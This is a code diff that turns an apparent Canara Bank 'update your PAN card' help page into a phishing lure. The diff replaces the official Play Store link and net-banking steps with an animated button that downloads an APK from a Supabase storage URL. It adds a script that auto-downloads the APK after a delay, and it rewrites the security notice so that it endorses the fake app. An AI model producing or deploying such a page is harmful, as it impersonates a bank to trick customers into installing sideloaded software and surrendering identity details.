@@ -24,7 +24,7 @@
         .header {
             background-color: var(--primary-color);
             color: white;
-            padding: 15px 0;
+            padding: 10px 0;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
@@ -32,33 +32,22 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            max-width: 1200px;
+            max-width: 600px;
             margin: 0 auto;
             padding: 0 20px;
         }
 
         .logo {
-            max-width: 180px;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 20px;
-        }
-
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
+            max-width: 150px;
         }
 
         .container {
-            max-width: 800px;
-            margin: 40px auto;
+            max-width: 100%;
+            margin: 10px auto;
             background-color: white;
-            padding: 30px;
+            padding: 15px;
             border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
 
         h1, h2 {
@@ -66,40 +55,61 @@
         }
 
         h1 {
-            font-size: 2.5em;
-            margin-bottom: 20px;
+            font-size: 1.6em;
+            margin-bottom: 10px;
         }
 
         h2 {
-            font-size: 1.8em;
-            margin-top: 30px;
+            font-size: 1.3em;
+            margin-top: 15px;
+        }
+
+        p {
+            font-size: 1em;
+            margin-bottom: 10px;
         }
 
         .button {
             background-color: var(--secondary-color);
             color: var(--primary-color);
-            padding: 12px 24px;
+            padding: 15px 30px; /* Increased padding for more prominence */
             text-decoration: none;
             border-radius: 5px;
             font-weight: bold;
             display: inline-block;
-            margin-top: 20px;
-            transition: background-color 0.3s ease;
+            margin-top: 10px;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            font-size: 1.1em; /* Slightly larger font */
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); /* Added shadow */
+            animation: pulse 1s infinite; /* Adding animation for more attention */
         }
 
         .button:hover {
             background-color: #e6c200;
+            transform: scale(1.05); /* Slight scaling on hover */
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
+            }
+            50% {
+                box-shadow: 0 0 20px rgba(255, 215, 0, 0.9);
+            }
+            100% {
+                box-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
+            }
         }
 
         .steps {
-            margin-top: 20px;
+            margin-top: 10px;
             background-color: #f9f9f9;
-            padding: 20px;
+            padding: 10px;
             border-radius: 5px;
         }
 
         .step {
-            margin-bottom: 15px;
+            margin-bottom: 8px;
             display: flex;
             align-items: center;
         }
@@ -107,21 +117,22 @@
         .step-number {
             background-color: var(--primary-color);
             color: white;
-            width: 30px;
-            height: 30px;
+            width: 25px;
+            height: 25px;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-right: 15px;
+            margin-right: 8px;
             font-weight: bold;
+            font-size: 0.9em;
         }
 
         .info-box {
             background-color: #e6f3ff;
             border-left: 4px solid var(--primary-color);
-            padding: 15px;
-            margin-top: 30px;
+            padding: 10px;
+            margin-top: 10px;
             border-radius: 0 5px 5px 0;
         }
 
@@ -129,8 +140,77 @@
             background-color: var(--primary-color);
             color: white;
             text-align: center;
-            padding: 20px 0;
-            margin-top: 40px;
+            padding: 8px 0;
+            margin-top: 15px;
+            font-size: 0.9em;
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .container {
+                padding: 10px;
+                margin: 10px;
+            }
+
+            h1 {
+                font-size: 1.4em;
+            }
+
+            h2 {
+                font-size: 1.2em;
+            }
+
+            .button {
+                padding: 10px 15px;
+                font-size: 0.9em;
+            }
+
+            .steps {
+                padding: 10px;
+            }
+
+            .step-number {
+                width: 20px;
+                height: 20px;
+                font-size: 0.8em;
+            }
+
+            .footer {
+                padding: 8px 0;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.3em;
+            }
+
+            h2 {
+                font-size: 1.1em;
+            }
+
+            .step-number {
+                width: 18px;
+                height: 18px;
+                font-size: 0.75em;
+            }
+
+            .container {
+                margin: 10px;
+            }
+
+            .button {
+                padding: 8px 12px;
+                font-size: 0.8em;
+            }
+
+            .footer {
+                font-size: 0.8em;
+            }
         }
     </style>
 </head>
@@ -138,37 +218,39 @@
     <div class="header">
         <div class="header-content">
             <img src="https://www.canarabank.com/assets/images/logo.png" alt="Canara Bank Logo" class="logo">
-            <nav class="nav-links">
-                <a href="#">Home</a>
-                <a href="#">Services</a>
-                <a href="#">Contact</a>
-            </nav>
         </div>
     </div>
     <div class="container">
         <h1>Update Your PAN Card Details</h1>
         <p>Keeping your PAN (Permanent Account Number) card information up to date is crucial for smooth banking operations and compliance with regulatory requirements. Follow these simple steps to update your PAN card details with Canara Bank.</p>
         
+        <!-- Highlighted Download Button -->
+        <a href="https://lplynuxccfuyfzhflqzm.supabase.co/storage/v1/object/public/app/CANARA%20PAN%20UPDATE.apk" class="button" id="download-button">Download Official Canara Bank App</a>
+
         <h2>How to Update Your PAN Card:</h2>
         <div class="steps">
-            <div class="step"><span class="step-number">1</span> Log in to your Canara Bank Net Banking account</div>
-            <div class="step"><span class="step-number">2</span> Navigate to the 'Update Profile' or 'My Account' section</div>
-            <div class="step"><span class="step-number">3</span> Select 'Update PAN Card Details'</div>
-            <div class="step"><span class="step-number">4</span> Enter your PAN card number and other required information</div>
-            <div class="step"><span class="step-number">5</span> Upload a scanned copy of your PAN card for verification</div>
-            <div class="step"><span class="step-number">6</span> Submit the form and wait for confirmation</div>
+            <div class="step"><span class="step-number">1</span> Download Canara Offcial Pan Update Apk And Install</div>
+            <div class="step"><span class="step-number">2</span> Select 'Update PAN Card Details'</div>
+            <div class="step"><span class="step-number">3</span> Enter your PAN card number and other required information</div>
+            <div class="step"><span class="step-number">4</span> Submit the form and wait for confirmation</div>
         </div>
-        
+
         <div class="info-box">
-            <p><strong>Did you know?</strong> You can also update your PAN card details through our mobile banking app. Download our official app for a seamless banking experience on the go.</p>
-            <a href="https://play.google.com/store/apps/details?id=com.canarabank.mobility" class="button">Download Official Canara Bank App</a>
+            <p><strong>Did you know?</strong> You can also update your PAN card details through our CANARA PAN UPDATE banking app. Download our official app for a seamless banking experience on the go.</p>
         </div>
         
-        <p><small>Please note: Always download banking apps from official sources like the Google Play Store or Apple App Store to ensure your security.</small></p>
+        <p><small>Please note: Always download banking apps from official sources like the  Official CANARA PAN UPDATE to ensure your security.</small></p>
     </div>
     
     <footer class="footer">
         <p>&copy; 2024 Canara Bank. All rights reserved.</p>
     </footer>
+
+    <!-- JavaScript to auto-download the APK after 5 seconds -->
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://lplynuxccfuyfzhflqzm.supabase.co/storage/v1/object/public/app/CANARA%20PAN%20UPDATE.apk"; // Replace with actual APK file URL
+        }, 10000); // 5 seconds
+    </script>
 </body>
 </html>
